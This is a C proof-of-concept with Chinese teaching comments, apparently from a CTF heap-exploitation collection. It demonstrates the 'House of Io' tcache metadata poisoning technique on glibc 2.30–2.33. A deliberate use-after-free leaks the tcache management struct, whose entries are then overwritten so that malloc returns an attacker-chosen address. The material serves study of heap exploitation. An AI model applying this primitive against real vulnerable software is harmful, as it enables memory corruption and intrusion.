/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_io
 * 文件标注范围：2.30 ~ 2.33
 * 模拟漏洞：能把 tcache_perthread_struct 本身当作已释放 tcache chunk 操作。
 * 核心流程：通过其未加密 entries 取得任意分配，是早期 safe-linking 的无泄露旁路。
 * 成功判据：malloc 返回 target；2.34 的随机 tcache_key 与布局/初始化变化使原始 PoC 终止。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// House of Io：释放后使用变体
//
// 原始资料：https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
//
// 本程序在 glibc 2.30、2.31、2.32 与 2.33 上验证。
//
// 该手法利用了早期 tcache 的一个关键事实：chunk 被释放进 tcache 后，用户区
// 第二个机器字会写入 tcache 管理结构地址，也就是 tcache_entry->key。攻击者若能
// 在释放后读写这个字段，便能取得 tcache_perthread_struct 地址。即使 2.32 已启用
// safe-linking，这个 key 以及管理结构中的 entries 数组仍未编码，因此仍可直接利用。
//
// 原始 House of Io 只适用于 glibc 2.29～2.33：这些版本把 tcache_entry->key
// 直接设为管理结构指针。得到该地址后即可覆盖 counts 与 entries，完成 tcache
// 元数据投毒，使指定尺寸的下一次 malloc 返回攻击者选择的地址。
//
// 需要注意，原文讨论的前置原语比较苛刻：向低地址方向的负溢出并不常见，双重释放
// 变体还要求特定释放顺序。这里采用更贴近常见 CTF 漏洞模型的释放后使用变体。

/*
 * 2.32 起 tcache_get 会检查取出的 entry 是否按 MALLOC_ALIGNMENT 对齐，
 * 因此任意分配目标不能再随便落在一个 8 字节对齐的全局变量上。
 * 这里显式做 0x10 对齐；它的第一个机器字还会在下方初始化为
 * PROTECT_PTR(&global_var, NULL)，供 safe-linking 版本解码 next 使用。
 */
unsigned long global_var __attribute__((aligned(16)));

struct overlay {
  uint64_t *next;
  uint64_t *key;
};

struct tcache_perthread_struct {
  uint16_t counts[64];
  uint64_t entries[64];
};

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /*
   * 2.32/2.33 的 REVEAL_PTR(e->next) 要求伪 entry 首字表示编码后的 NULL：
   *     PROTECT_PTR(&e->next, NULL) == (uintptr_t)&e->next >> 12
   * 2.30/2.31 尚未启用 safe-linking；它们虽会把这个值当普通 next，
   * 但本次取出后 count 已归零，不会继续消费该伪链，因此同一写法兼容。
   */
  global_var = (uintptr_t)&global_var >> 12;

  struct overlay *ptr = malloc(sizeof(struct overlay));

  ptr->next = malloc(0x10);
  ptr->key = malloc(0x10);

  free(ptr);

  struct tcache_perthread_struct *management_struct =
      (struct tcache_perthread_struct *)ptr->key;

  management_struct->counts[0] = 1;

  management_struct->entries[0] = (uint64_t)&global_var;

  uint64_t *evil_chunk = malloc(0x10);

  assert(evil_chunk == &global_var);
  return 0;
}
